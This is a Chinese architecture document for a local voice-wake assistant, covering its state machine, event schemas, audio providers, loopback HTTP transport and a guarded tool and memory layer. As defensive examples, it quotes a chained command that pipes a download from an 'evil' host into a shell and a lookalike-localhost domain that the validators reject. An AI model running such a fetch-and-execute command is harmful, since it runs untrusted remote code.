# 技术架构与组件边界

> 工作区:`D:\program\vioce-wake`
> 最后更新:2026-08-22（VoiceRuntime 生命周期加固）
> 本文描述磁盘上**已实现**的架构。计划中但未落地的部分明确标注「未实现」。
> 平台层（第 9 节）已按 P3～P7 分阶段落地；本文仍明确标注尚未实现或仅有 AUTO/SIM 证据的部分。

## 1. 分层总览

```
┌──────────────────────────────────────────────────────────┐
│  桌面层 Desktop (Tauri 2 + TypeScript)                    │
│  desktop/src-tauri/src/main.rs   透明置顶窗口             │
│  desktop/src/main.ts             唤醒球渲染与状态标签      │
└────────────────────────┬─────────────────────────────────┘
                         │  事件契约(单向:后端 → 前端)
                         │  contracts/voice-events.schema.json
┌────────────────────────┴─────────────────────────────────┐
│  插件门面层 Plugin Facade                                 │
│  vox_plugin/plugin.py   VoicePlugin:状态机/音频门面               │
│  vox_plugin/runtime.py  VoiceRuntime:派发、TTS、桌面桥接与生命周期 │
└──────┬──────────────────────────────┬────────────────────┘
       │                              │
┌──────┴───────────────┐   ┌──────────┴────────────────────┐
│ 核心层 Core           │   │ 传输层 Transport               │
│ core/state.py        │   │ core/session_bridge.py         │
│   状态机              │   │   ConversationTransport 协议   │
│ core/events.py       │   │   LocalEvoXTransport 实现       │
│   信封构造与校验       │   └──────────┬────────────────────┘
│ core/audio/          │              │
│   语音提供器包         │              │
└──────┬───────────────┘              │
       │                              │
┌──────┴───────────────┐   ┌──────────┴────────────────────┐
│ 本地模型 models/      │   │ EvoX 会话(外部)                │
│ KWS / VAD / TTS      │   │ HTTP localhost:8765            │
│ 声纹 speaker(P1)     │   └───────────────────────────────┘
└──────────────────────┘

平台层 Platform（`memory`、`tools`、`agents`、`dispatch` 已实现，P3～P7）：
core/agents/ 适配器 · core/dispatch/ 派发 · core/tools/ 工具 · **core/memory/ 记忆**
```

### 1.1 运行时装配与生命周期

`vox_plugin/runtime.py` 是生产运行时的组合根，负责把 `VoicePlugin`、本地工具、记忆、Agent registry、`Dispatcher` 和可选 `DesktopBridge` 装配成一条回合链：

```text
recognized text → VoiceRuntime.say()
  → plugin.submit_text() [LISTENING → THINKING]
  → dispatcher.dispatch() / confirmation retry
  → plugin.complete_turn() [TTS → LISTENING]
```

生命周期采用以下约束：

- `start()` 是可回滚的初始化事务。任一步骤抛错，已创建的 adapter、capture、TTS、bridge 和 SQLite store 都会被尽力释放，`_started` 保持 `False`，调用方可重试。
- `close()` 是幂等的 best-effort 清理。它停止 capture/TTS，取消并关闭 adapter，关闭桌面桥和 memory store，清空待处理语音队列；第二次调用不重复释放资源。
- 派发或回合完成异常不会冒出音频回调；运行时发出不含用户文本的 `task.failed`，并把状态恢复到 `LISTENING`。确认卡没有明确 `approved == true` 时保持拒绝。

这些是 AUTO 级行为测试，不等同于 REAL-MIC、REAL-AGENT 或 REAL-WIN 验收。

**依赖方向铁律**:核心层不认识插件层,插件层不认识桌面层。所有跨层通信走事件契约或协议接口,任何 sherpa-onnx / sounddevice / VoxCord 的类型都不得出现在公开事件结构里。

## 2. 事件契约(contract,契约)

两个契约文件,同一个信封。`contracts/voice-events.schema.json` 是语音链路的约定(9 种类型),`contracts/agent-events.schema.json` 是平台层的约定(12 种类型),都是 JSON Schema Draft 2020-12。

**信封结构**(envelope,信封)—— 两个文件**逐字段相同**:

| 字段 | 类型 | 必填 | 说明 |
|---|---|---|---|
| `version` | 常量 `"1"` | 是 | 契约版本,破坏性变更时递增 |
| `type` | 枚举 | 是 | 语音 9 种 / 平台 12 种之一 |
| `id` | 字符串 | 是 | 事件唯一标识(UUID 或 `state-N`) |
| `timestamp` | ISO 8601 | 是 | UTC 时间戳 |
| `payload` | 对象 | 否 | 各事件类型自有字段 |

`additionalProperties: false` — 严禁额外字段,这是防止 SDK 类型泄漏的第一道闸门。

**唯一构造点**:`core/events.py`。`build_event()` 造信封;`validate_event(event, schema_path)` 对着**指定的**契约校验(必填键、`additionalProperties`、`version` 常量、`type` 枚举);`validate_any_event(event)` 先用 `contract_for()` 按 `type` 查出归属契约再校验 —— 这是**两条流合流的落点**,给传输边界与桌面桥用;只归属单一契约的调用方继续传路径,这样送错流的事件仍会响。枚举**在运行时从契约文件读**,不在 Python 里镜像一份 —— 这样 schema 与代码无法各自漂移。校验是手写的,不引 `jsonschema`:契约只有十几行,一个新依赖换不来什么。

**为什么分两个文件而不是扩一个枚举**:`voice-events.schema.json` 必须**字节不变**、version 保持 `"1"`(NFR-5.8)。这条约束现在由 `tests/test_agent_event_schema.py` 里的 SHA-256 摘要钉住 —— 「我们没打算改它」不是保证。两个契约的 `type` 枚举**互斥**(有测试),否则 `contract_for()` 会歧义;信封形状相同(有测试),否则合流就变成翻译。理由见 ADR 005。

**语音 9 种事件类型**:

| 事件 | 触发时机 | payload 关键字段 |
|---|---|---|
| `wake.detected` | 唤醒词命中且声纹通过 | `keyword`, `score`(声纹相似度), `synthetic?` |
| `wake.rejected` | 声纹校验否决唤醒 | `reason`, `score` |
| `turn.started` | 回合开始 | `text` |
| `asr.final` | 识别文本定稿 | `text` |
| `llm.delta` | 回复增量 | `text` |
| `tts.chunk` | 合成音频分块 | `index`, `text` |
| `turn.done` | 回合正常结束 | — |
| `turn.cancelled` | 回合被打断 | — |
| `state.changed` | 状态迁移 | `from`, `to`, `reason` |

**平台 12 种事件类型**(P2 定契约,产出点分散在 P3–P6):

| 事件 | 触发时机 | 产出方 |
|---|---|---|
| `task.dispatched` | 路由决定了模式与 agent 集合 | P6 dispatcher |
| `task.progress` | 派发中的进度(**不是**回复增量,增量仍走 `llm.delta`) | P6 dispatcher |
| `task.done` / `task.failed` | 派发结束 | P6 dispatcher |
| `agent.tripped` / `agent.recovered` | 熔断器开合 | P6 breaker |
| `tool.requested` | 工具请求进入政策门 | P4 policy |
| `tool.confirm_required` | 政策原则上允许但要求显式确认(`shell.run`) | P4 policy |
| `tool.executed` / `tool.refused` | 工具执行结果 / 被拒 | P4 policy |
| `memory.written` / `memory.recalled` | 记忆写入 / 召回 | P3 store ✅ **已有产出点** |

**六态状态机不为这些事件加子状态。** 派发全过程发生在 `thinking` 内部,进度只由 `task.*` 表达 —— 状态机因此不反映派发细节,换来的是三个现有契约测试一个字不改(ADR 005)。

**配置契约**:`contracts/agents.schema.json` 定 `config/agents.toml` 解析后的形状(`agents` 数组,每项 `name` + `kind` 必填,`kind` 枚举与 `AGENT_KINDS` 由测试锁死一致)。校验在 `core/agents/schema.py`,同样手写、同样只实现契约实际用到的关键字子集 —— 并有一条反向测试断言 schema **不许**超出这个子集,否则会出现「写着像约束、实际不生效」的字段。配置文件本身随适配器在 P5 落地。

## 3. 核心层:状态机(`core/state.py`,53 行)

6 个状态,**严格转移表**,非法迁移直接抛 `ValueError`:

```
idle ──→ listening ──→ thinking ──→ speaking
 ↑           │             │            │
 │           ↓             ↓            ↓
 └───── cancelled ←────────┴────────────┤
 └───── error ←─────────────────────────┘
```

| 当前状态 | 允许迁移到 |
|---|---|
| `idle` | `listening` |
| `listening` | `thinking`, `cancelled`, `error` |
| `thinking` | `speaking`, `cancelled`, `error` |
| `speaking` | `listening`(连续对话), `idle`, `cancelled`, `error` |
| `cancelled` | `idle`, `listening` |
| `error` | `idle`, `listening` |

设计要点:

- **`speaking → listening`** 是连续多轮对话的关键边,不回 `idle` 就能接着说下一句。
- 每次迁移自动产出符合契约的 `state.changed` 事件,`sequence` 单调递增,`history` 全量留存。
- 允许**同态迁移**(`target == self.state`)不报错,便于幂等调用。
- `VoiceState` 用 `StrEnum`,序列化直接得字符串,不需要额外转换。

## 4. 核心层:语音提供器(`core/audio/` 包)

原 `core/providers.py`(295 行)已按职责拆包,`providers.py` 只剩 29 行的 re-export(重导出)薄壳,现有导入零改动:

| 模块 | 行数 | 内容 |
|---|---|---|
| `core/audio/base.py` | 15 | `ProviderStatus`、`ProviderUnavailable` |
| `core/audio/kws.py` | 86 | `SherpaKeywordProvider` |
| `core/audio/vad.py` | 88 | `SherpaVadProvider` |
| `core/audio/capture.py` | 70 | `SounddeviceWakeCapture` |
| `core/audio/speaker.py` | 332 | `SpeakerVerificationProvider`、`SpeakerStore` |
| `core/audio/voxcord.py` | 62 | `VoxCordAdapter`(可选外部参考) |

四个语音类,**全部懒加载**(lazy loading,延迟加载):模型缺失、依赖未安装、设备不可用时返回诊断结果,**绝不在模块导入阶段崩溃**。这是让项目在无模型环境下仍可测试的关键。

统一返回结构 `ProviderStatus(available: bool, source: str, details: dict)`。

### 4.1 `SherpaKeywordProvider` — 唤醒词识别

- 职责**只有模型推理**,不碰麦克风。这个边界让模型测试能用 wav 或数组跑,无需开设备。
- `available` 属性静态检查文件齐备:`encoder`/`decoder`/`joiner` 三个 `.int8.onnx` + `tokens.txt` + `keywords.txt`。
- 默认模型后缀 `epoch-99-avg-1-chunk-16-left-64`,阈值 0.25,2 线程,CPU 执行。
- `feed(stream, samples)` 送入一个实时分块,循环解码直到不再 ready,命中后 `reset_stream` 防重复触发。
- `close()` 置空 `_spotter` 释放原生状态(Python 包装层无显式 close)。

### 4.2 `SherpaVadProvider` — 端点检测

- Silero VAD 经 sherpa-onnx `VoiceActivityDetector` 执行,**有状态**。
- 可配阈值 0.5、最短静音 0.5s、最短语音 0.25s、最长语音 20s、缓冲 60s。
- `load()` 会调 `config.validate()`,配置非法即报错而非静默跑偏。
- `_result()` 排空内部段队列,返回 `{speech: bool, segments: [{start, samples}]}`。

### 4.3 `SounddeviceWakeCapture` — 实时麦克风采集

- 唯一接触音频设备的类,包装 `sounddevice.InputStream`。
- 16 kHz、blocksize 1600(100 ms)、单声道、float32。
- 支持注入 `speech_gate` 回调,可在送入 KWS 前先过 VAD 闸门,省算力。
- `stop()` 依次 stop/close 流并调用 provider 的 `close()`,**保证设备与原生状态都释放**。

### 4.4 `VoxCordAdapter` — 可选外部参考(本机不存在)

- 动态从 `D:\program\voxcord`(可用 `VOX_VOXCORD_ROOT` 覆盖)导入唤醒与 VAD 实现。
- 本机无此目录,`load()` 返回 `available: False, reason: "voxcord core not found"`。
- 相关测试已用 `pytest.mark.skipif` 优雅跳过,**不影响发布路径**。

### 4.5 `SpeakerVerificationProvider` — 声纹准入(332 行)

唤醒门。KWS 只答「有没有说这个词」,声纹答「是谁说的」。完整决策见 ADR 002。

- 复用 sherpa-onnx 1.13.4 已含的 `SpeakerEmbeddingExtractor` + `SpeakerEmbeddingManager`,**零新依赖**,不扩大 ADR 001 的运行时边界。
- `SpeakerStore` 管 `enrollment/voiceprints.json`:带 `version` 字段、原子写(先写 `.tmp` 再 `replace`)、版本不认识或 JSON 损坏都抛 `ProviderUnavailable` 而非静默降级。
- **fail-closed(失败即关闭)**:`verify()` 对普通拒绝**从不抛异常**,而是返回 `accepted=False` 加原因;模型缺失、无人注册、embedding 抛异常三条路径全部落在拒绝一侧。只看 `accepted` 分支的调用方天然是 fail-closed 的。
- `_best_match()` 逐个 `score()` 而不用 `manager.search()`:后者只答是否,前者还给出分数,阈值调优与 `wake.rejected` 诊断都要这个数。
- `describe()` 是**唯一**被许可的注册状态视图,只报名字与样本数,**绝不含向量** —— 注册数据是生物特征,有专门测试守这一条。
- 门的位置是 **KWS 命中的瞬间**,校验采集层 3 秒内存环形缓冲(P1),拒绝发生在任何交互之前。缓冲永不落盘、永不出进程。

## 5. 传输层:EvoX 会话桥接(`core/session_bridge.py`,92 行)

### 5.1 `ConversationTransport` 协议

用 `typing.Protocol` 定义,只有两个方法:

```python
send(text: str, *, session_id: str | None = None) -> dict   # 返回须含 turn_id
cancel(turn_id: str) -> dict
```

这个极小接口是**会话后端可替换性**的支点。t10 已验证:两个不同实现驱动同一回合路径,行为完全一致。

### 5.2 `LocalEvoXTransport` 实现与安全姿态

选择带认证的 localhost HTTP,原因是 EvoX 未向本运行时暴露稳定的进程内会话端点,且传输层必须保持可换。

五道安全校验(均有测试覆盖):

| 校验 | 行为 |
|---|---|
| Bearer token | 缺失即抛 `BridgeError`,`diagnose()` 只报是否配置、**不输出内容** |
| 明文 HTTP 限制 | 仅允许 `localhost` 或经 `ipaddress` 解析确认的 loopback |
| 相似域名拦截 | `localhost.evil.example` 这类**会被拒绝**(解析后判断,非字符串前缀匹配) |
| URL 凭据拦截 | URL 内含 `username`/`password` 直接拒绝 |
| turn_id 编码 | 取消路径用 `quote(safe="")` 编码,防路径注入 |

响应缺 `turn_id` 视为失败;HTTPS 则不受 loopback 限制,可指向远端。

## 6. 插件门面层(`vox_plugin/plugin.py`,191 行)

`VoicePlugin` 是 EvoX 看到的唯一接口,dataclass 实现,持有状态机、事件列表、可选传输层与可选采集层。信封构造已下沉到 `core/events.py`,`_event()` 现在只负责调 `build_event()` 并把结果追加进 `self.events`。

### 6.1 工具面(tool surface)

| 分类 | 方法 |
|---|---|
| 生命周期 | `start` `stop` `pause` `resume` |
| 唤醒与回合 | `wake_detected` `wake_test` `submit_text` `complete_turn` `cancel` |
| 检视 | `status` `devices` `diagnose` |

### 6.2 回合编排流程

```
wake_detected  → wake.detected + state.changed(listening)
submit_text    → turn.started + asr.final + state.changed(thinking)
                 └→ 若挂了传输层:transport.send(),记录 last_turn_id / last_reply
complete_turn  → llm.delta + tts.chunk + state.changed(speaking)
                 → turn.done + state.changed(listening)   ← 连续对话回边
cancel         → transport.cancel(last_turn_id) + state.changed(cancelled) + turn.cancelled
```

### 6.3 三个值得注意的设计决策

1. **`stop()` 的逃生通道** — 直接赋值 `machine.state = IDLE` 而不走 `transition()`。理由:停止必须从任何状态都能成功,包括状态机无法正常迁移出的状态。这是有意的、带注释的例外。
2. **采集启动失败回滚** — `start()` 中若 `audio_capture.start()` 抛异常,先把 `running` 复位为 `False` 再重新抛出,不留下「标记为运行但设备未开」的不一致状态。
3. **`diagnose()` 零凭据泄漏** — 只报 `token_configured: bool`,同时汇报 KWS/VAD 模型就绪、provider 可用性、传输层与采集层是否挂载、音频后端可用性。

## 7. 桌面层

### 7.1 窗口(`desktop/src-tauri/src/main.rs`,31 行)

`WebviewWindowBuilder` 构建名为 `wake` 的窗口:

| 属性 | 值 | 用途 |
|---|---|---|
| `inner_size` | 210 × 205 | 紧凑唤醒球 |
| `decorations` | `false` | 无边框 |
| `transparent` | `true` | 透明合成 |
| `always_on_top` | `true` | 常驻置顶 |
| `skip_taskbar` | `true` | 不占任务栏 |
| `focused` | `false` | **不抢焦点** |
| `visible` | 由 `VOX_WAKE_VISIBLE` 环境变量控制 | 默认隐藏,便于无干扰开发 |
| `resizable` | `false` | 固定尺寸 |

定位逻辑:读当前显示器尺寸与 `scale_factor`,水平居中、底部上移 250 逻辑像素。**注意**:该 DPI 换算只做过 `cargo check`,真机 125%/150%/175% 缩放未验收(发布阻塞项 #5)。

### 7.2 前端(`desktop/src/main.ts` 34 行 + `style.css`)

- 监听 `vox-voice-state` 自定义事件,取 `state` 与 `amplitude` 驱动渲染。
- 状态中文标签:待机 / 已唤醒 / 聆听中 / 思考中 / 正在回复 / 需要处理。
- `amplitude` 钳制在 `[0.12, 1]`,写入 CSS 变量 `--amplitude`;`--phase` 由 `requestAnimationFrame` 循环推进。
- 当前是 **CSS-only 渲染**(conic-gradient 核心 + 三层波纹环 + blur)。Canvas 2D 生产渲染器属 Phase 4(t28–t35),**尚未实现**。
- 已内置自验证钩子:`__READY__`、`render_state_to_text()`、`step(ms)`,以及 `?test=1` 冻结模式。
- CSP 收紧为 `default-src 'self'; style-src 'self' 'unsafe-inline'`。

## 8. 平台层(`core/{agents,dispatch,tools,memory}/`,契约 + 契约校验)

Phase 4 新增的四个包已按 P3～P7 分阶段实现：`agents` 提供 CLI/EvoX/ACP/HTTP 适配器与 registry，`dispatch` 提供 intent/router/aggregator/breaker/dispatcher，`memory` 与 `tools` 负责本地记忆和安全工具门。导入这四个包**不得**启动子进程或打开套接字；真正的外部进程/网络动作只发生在显式打开适配器并执行回合时，这条边界由测试固定。

六个新边界:

| # | 边界 | 位置 | 守什么 |
|---|---|---|---|
| 1 | **声纹门** | `core/audio/speaker.py` + 采集层 | 未授权语音在此静默终止,拒绝先于一切交互(ADR 002)。**已接线**(P1) |
| 2 | **agent 适配** | `core/agents/contract.py`(83 行) | `AgentAdapter` 三方法 + `AgentChunk` 三种类型;字段只许 `str`/`int`/`float`/`frozenset`/`tuple`/`Mapping`,**任何 agent SDK 类型都进不来** —— 红线 2 由构造保证,不靠评审(ADR 003) |
| 3 | **派发** | `core/dispatch/contract.py`(93 行) | `single`/`race`/`fanout` 三模式;语音默认前两者,`fanout` 会把首字延迟拖成最慢 agent 的延迟(ADR 005) |
| 4 | **路由汇总** | 同上 | 五维打分(能力/成本/延迟/成功率/负载)+ 熔断器;`Aggregator.merge(mode, streams)` |
| 5 | **工具** | `core/tools/`(契约 80 行 + 实现 912 行) | `ToolPolicy.check()` 返回 `None` 放行、返回拒绝的 `ToolResult` 挡下。`voice` 与 `agent` 两个 origin 走**同一道门**,agent 拿不到用户语音拿不到的能力。**已实现**(P4) |
| 6 | **记忆** | `core/memory/`(契约 59 行 + 实现 1093 行) | 三层(short/mid/long)× 三类(turn/fact/audit);**只存文本,音频永不入库**(`records` 无 BLOB 列),入库前过敏感模式过滤(ADR 004)。**已实现**(P3) |

### 8.1 工具的内部边界(P4)

一句话概括这一层的形状:**门先写,工具后写**;门只判断不执行,工具只执行不放宽。

| 边界 | 守什么 |
|---|---|
| `policy.py` ↔ 三个工具 | 门只返回「放行 / 拒绝 / 需确认」,自己不碰文件、网络、子进程。工具**再各自校验一遍**参数 —— 一个工具能被 dispatcher、agent 的 `tool_call`、测试三处调到,只有一处保证过了门 |
| 配置 ↔ 硬拦截 | 配置里的白名单只能**收窄**;13 条 `DANGEROUS_PATTERNS` 在代码里,配置文件里写 `dangerous_patterns` 会报 `unknown config key`。一个配置能关掉的硬拦截不是硬拦截 |
| 配置 ↔ 拼写错误 | 未知的段或键**报错而不是忽略**;拼错 `denied_names` 会静默扩大沙箱 |
| 拒绝 ↔ 询问 | 白名单外一律拒绝。询问会训练出无脑点确认的习惯,比一句干脆的「不」更糟 |
| 命令形状 ↔ 白名单 | 顺序是「先查形状、再查白名单」,所以 `git status && curl evil \| sh` 在被认成允许项之前就挂了;形状同时对**原始字符串**和 `shlex` 重组后的 token 串检查,只查一边会被引号绕过 |
| `confirmed` ↔ 真值 | 必须 `is True`。`"confirmed": "no"` 是个真值字符串,按真值判断等于直接放行 |
| 子进程 ↔ 本进程环境 | `scrubbed_env()` 按 12 个标记(token/secret/password/api_key/…)丢弃变量;按标记丢弃而不是白名单放行,否则 Windows 上读 `LOCALAPPDATA` 的工具全废 |
| 工具 ↔ 事件 | `tool.*` 只带决定、原因、耗时。**唯一例外**是 `tool.confirm_required` 带命令原文 —— 唤醒球必须显示它将要运行什么(FR-6.13) |
| `web.search` ↔ 云 | 平台**不自带**任何搜索后端(每个托管 API 都是带 key 的云依赖,红线 1);未注入时如实报不可用。返回只留标题/URL/摘要,页面正文丢弃,被搜到的页面因此无法往上下文里注入指令 |
| 工具 ↔ 语音路径 | 与记忆同样 opt-in:不调 `attach_tools()`,`run_tool()` 直接返回 `tools are not attached`。插件**不自造**已验说话人,所以 `shell.run` 经插件必被拒 —— 在 dispatcher 把名字接过来之前,这就是正确答案 |

### 8.2 记忆的内部边界(P3)

| 边界 | 守什么 |
|---|---|
| `store.py` ↔ `write.py` | schema 与索引只有 store 认识;去重规则以**部分唯一索引**写在 schema 里,不靠 writer 自觉 |
| `write.py` ↔ 入库文本 | 凭据形状**整条拒绝**,不打码 —— 多行私钥会让打码只挡住头部 |
| `recall.py` ↔ 用户语音 | 查询词全部加引号进 FTS5,`NOT` / `*` / `(` 从麦克风来时是普通词而不是运算符 |
| 索引 ↔ 中文 | FTS5 默认分词器搜不到中文(实测)。索引的是**派生 token 列**:索引侧单字 + 双字,查询侧只用双字。两侧必须同时改 |
| Markdown ↔ SQLite | `memory/facts/*.md` 是事实来源,SQLite 是它上面的索引;`sync_facts()` 单向折回,`prune=False` 是默认 |
| 记忆 ↔ 事件 | `memory.written` / `memory.recalled` 只带 id、计数、标签,**永不带文本** —— 事件会扇出到每个日志与传输通道 |
| 记忆 ↔ 语音路径 | opt-in:不调 `attach_memory()` 就没有数据库文件;写入失败被吞掉,记忆不是回合的前提条件 |

另有两条契约边界在 §2:平台事件契约(12 种 `task.*`/`agent.*`/`tool.*`/`memory.*`)与 agent 注册契约,两者都在 P2 落地;`memory.*` 的产出方在 P3 已就位,其余分散在 P4–P6。

意图分类**先用规则不用模型**:「读一下 X」「搜一下 Y」「运行 Z」正则命中直执行本地工具,延迟从秒级降到毫秒级,且规则命中的部分可以纯 AUTO 测试;未命中才走 agent 路由。

`core/session_bridge.py` 保留原样,降级为 `agents/evox.py` 的实现细节 —— 五道安全校验不得随之降级。

## 9. 组件边界速查表

| 边界 | 谁不许知道谁 | 强制手段 |
|---|---|---|
| 模型推理 ↔ 音频设备 | `SherpaKeywordProvider` 不碰麦克风 | 采集逻辑独立在 `SounddeviceWakeCapture` |
| 核心层 ↔ 插件层 | `core/` 不 import `vox_plugin/` | 单向依赖,插件层 import 核心层 |
| 后端 ↔ 前端 | 前端只认事件契约 | JSON Schema + `additionalProperties: false` |
| 语音契约 ↔ 平台契约 | 两个契约互不知道对方的类型 | 枚举互斥 + 信封同形(测试断言),归属由 `contract_for()` 查表 |
| 业务 ↔ 会话后端 | 插件只认 `ConversationTransport` | Protocol 接口,mock 可完全替代 |
| 项目 ↔ VoxCord | 无 VoxCord 也能跑全部发布路径测试 | 动态 import + skipif 门控 |
| 渲染路线 ↔ 应用协调 | 换 Canvas/WebGL 不动业务代码 | 计划中的 `Renderer` 接口(Phase 4) |
| 业务 ↔ agent 实现 | 派发层不认识 claude/codex/opencode | `AgentAdapter` Protocol + 类型只许原语 |
| 工具调用 ↔ 调用来源 | 工具不区别对待 voice 与 agent | 单一 `ToolPolicy.check()` 入口 |
| 记忆 ↔ 音频 | 记忆层拿不到波形 | `records` 无 BLOB 列 + `bytes` 抛 `TypeError` + 断言测试 |
| 记忆 ↔ 任务注入 | 记忆不认识 `Task` 形状 | 注入是 dispatch 的职责,不是 memory 的 |

## 10. 尚未实现的架构件(Phase 4 起)

| 组件 | 计划位置 | 阶段 | 说明 |
|---|---|---|---|
| ~~声纹门与内存环形缓冲~~ | `core/audio/{capture,ring}.py` | P1 | ✅ **已完成** |
| ~~`wake.rejected` 事件产出~~ | 插件层 | P1 | ✅ **已完成** —— 声纹门是它第一个真实触发条件 |
| ~~`feed()` 返回真实 score~~ | `core/audio/kws.py` | P1 | ✅ **已改正**:`KeywordResult` 不含置信度,`feed()` 返回 `(keyword, None)`;`wake.detected` 的分数来自声纹相似度 |
| ~~平台事件契约~~ | `contracts/agent-events.schema.json` + `agents.schema.json` | P2 | ✅ **已完成** |
| ~~记忆实现~~ | `core/memory/{store,write,recall}.py` | P3 | ✅ **已完成** —— SQLite + FTS5,中文靠派生双字 token 列,凭据整条拒绝;`prune_turns()` 与召回消费方待 P6 接线 |
| ~~工具实现~~ | `core/tools/{policy,fs,web,shell,runner}.py` | P4 | ✅ **已完成** —— 门先落地(`policy.py`),三个工具在后;`web.search` 无内置后端,`shell.run` 的确认 UI 在 P8 |
| agent 适配器 | `core/agents/{cli,evox}.py` | P5 | 再 `acp.py`/`http.py`/`openclaw.py`(P7) |
| 派发/路由/汇总 | `core/dispatch/*.py` | P6 | 五维打分 + 熔断器 + 三模式 |
| 流式 ASR 提供器 | `core/audio/` | Phase 4 | 目前只有 KWS,识别文本靠外部注入 |
| TTS 播放队列与打断 | 新增模块 | Phase 4 | 现只发 `tts.chunk` 事件,无真实播放 |
| 唤醒球运行时显隐 | `main.rs` `show_orb`/`hide_orb` | P8 | 现在可见性由环境变量静态决定 |
| Canvas 2D 生产渲染器 | `desktop/src/renderer/` | P8 | t28–t35,含质量分档选择器与 `Renderer` 抽象 |
| 工具确认交互面 | `desktop/src/` | P8 | `shell.run` 的确认 UI 落在这里 |
| 超时/重连/错误恢复 | `vox_plugin/runtime.py` + `core/state.py` + 传输层 | Phase 4 | VoiceRuntime 生命周期与回合失败恢复已实现；真实重连策略仍待联调 |
| 系统托盘常驻 | `main.rs` | Phase 4 | 发布阻塞项 #5 一部分 |
